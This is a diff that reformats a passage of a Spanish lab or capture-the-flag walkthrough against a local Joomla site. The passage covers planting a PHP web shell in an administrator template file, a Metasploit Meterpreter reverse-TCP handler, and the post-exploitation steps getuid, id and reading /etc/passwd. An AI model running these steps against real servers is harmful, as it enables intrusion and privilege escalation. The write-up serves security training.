@@ -70,46 +70,46 @@ PHP.
 Probamos, ahora sí, inyectar la web-shell en “/administrator/templates/atum/index.php” y
 guardamos.  
 
-[IMG Plantilla + WebShell]  
+[IMG Plantilla + WebShell]    
 
 Una vez logrado, hay que probar si corre. Vamos a http://localhost:9090/administrator y vemos
-que la página se queda cargando. Esto es indicativo de que la web-shell está funcionando.
-Bien, una vez está todo listo hay que preparar Meterpreter con los mismo datos que se usaron
-para msfvenom:
-1- mfconsole
-2- use exploit/multi/handler
-3- set payload php/meterpreter/reverse_tcp
-4- set lhost 172.18.0.3
-5- set lport 6660
-6- exploit (o run)
-[IMG]
-Una vez que el exploit está a la escucha hay que re-lanzar la webshell para lograr la conexión
-reversa con Meterpreter. He aquí 2 maneras:
-1- Accediedo al navegador desde el host:
-·
-http://localhost:9090/administrator (no hace falta ingresar credenciales)
-[IMG url]
-2- Usando curl desde Kali:
-·
-curl http://172.18.0.3/administrator
-[IMG]Tenemos acceso.
-POST-EXPLOTACIÓN (elevar privilegios):
+que la página se queda cargando. Esto es indicativo de que la web-shell está funcionando. Bien, una vez está todo listo hay que preparar Meterpreter con los mismo datos que se usaron
+para msfvenom:  
+> 1- mfconsole  
+> 2- use exploit/multi/handler  
+> 3- set payload /php/meterpreter/reverse_tcp  
+> 4- set lhost 172.18.0.3  
+> 5- set lport 6660  
+> 6- exploit (o run)  
+
+[IMG]  
+
+Una vez que el exploit está a la escucha hay que re-lanzar la webshell para lograr la conexión reversa con Meterpreter. He aquí 2 maneras:
+> 1. Accediedo al navegador desde el host: 
+http://localhost:9090/administrator (no hace falta ingresar credenciales)  
+> 2. Usando curl desde Kali: curl http://172.18.0.3/administrator  
+
+[IMG]  
+
+Tenemos acceso.  
+
+#### POST-EXPLOTACIÓN (elevar privilegios):
 Una vez dentro con Meterpreter, se pueden hacer muchas cosas. Primero verificar usuario:
-·
-·
-getuid
+* getuid  
+
 También podemos ejecutar shell:
-o whoami
-o id
-Nos da que somos www-data, usuario típico administrador del servidor web del sistema y por
-defecto sin privilegios, ni consola de login.
-Luego, enumeramos usuarios del sistema con:
-·
-cat /etc/passwd
-[IMG]
+* whoami
+* id
+* 
+Nos da que somos www-data, usuario típico administrador del servidor web del sistema y por defecto sin privilegios, ni consola de login. Luego, enumeramos usuarios del sistema con:  
+* cat /etc/passwd
+
+[IMG]  
+
 Obtenemos dos de relevancia:
-1- luisillo
-2- ubuntu
+> 1. luisillo
+> 2. ubuntu
+
 Ahora que tenemos por donde empezar a escalar privilegios, hay que pensar en buscar
 credenciales dentro del sistema. Puesto que no hay un servidor SSH con el cual se pueda
 pensar en realizar un ataque de diccionario (con rockyou.txt, etc), probamos buscarlas con
